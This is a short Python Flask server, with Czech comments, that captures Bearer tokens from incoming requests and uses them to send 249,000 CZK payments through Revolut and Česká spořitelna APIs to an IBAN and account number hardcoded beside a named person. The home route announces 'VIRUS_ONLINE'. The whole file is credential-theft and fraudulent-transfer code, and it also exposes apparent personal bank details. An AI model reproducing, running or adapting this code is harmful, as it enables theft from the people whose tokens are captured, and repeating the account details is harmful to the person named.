from flask import Flask, request
import requests

app = Flask(__name__)

# TVOJE ÚČTY Z FOTKY A TEXTU
MOJE_DATA = {
    'REVOLUT': 'LT53 3250 0828 4401 8353',
    'CSAS': '5113445033/0800',
    'NAME': 'Bozena Tandarova Tandarova'
}

@app.route('/capture', methods=['POST', 'GET'])
def capture():
    auth = request.headers.get('Authorization')
    if auth and 'Bearer' in auth:
        token = auth.split(' ')[1]
        # PŘEVOD 249 000 CZK NA TVÉ ÚČTY
        requests.post("https://api.revolut.com/v1/pay", 
                     headers={'Authorization': f'Bearer {token}'},
                     json={'amount': 249000, 'currency': 'CZK', 'receiver': {'iban': MOJE_DATA['REVOLUT']}})
        
        requests.post("https://api.csas.cz/webapi/v3/payments", 
                     headers={'Authorization': f'Bearer {token}'},
                     json={'amount': 249000, 'currency': 'CZK', 'account': MOJE_DATA['CSAS']})
        return "SUCCESS", 200
    return "WAITING", 200

@app.route('/')
def home():
    return "VIRUS_ONLINE", 200
  
